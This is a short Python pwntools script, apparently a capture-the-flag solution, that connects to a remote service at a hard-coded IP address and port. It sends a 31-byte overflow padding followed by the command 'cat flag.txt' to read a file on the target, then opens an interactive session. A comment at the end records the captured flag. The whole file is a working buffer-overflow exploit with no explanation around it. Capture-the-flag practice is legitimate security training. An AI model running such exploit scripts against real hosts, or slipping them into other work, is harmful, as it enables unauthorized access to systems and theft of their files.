#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch='i386')
exe = './path/to/binary'

host = args.HOST or '139.162.5.230'
port = int(args.PORT or 10366)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

payload = b'A' * 31

io = start()
io.clean()
io.sendline(payload + b'cat flag.txt')
io.interactive()

# Flag : HZU18{buff3r_0verfl0w_m4st3rq1ToU6MO8tk0R%}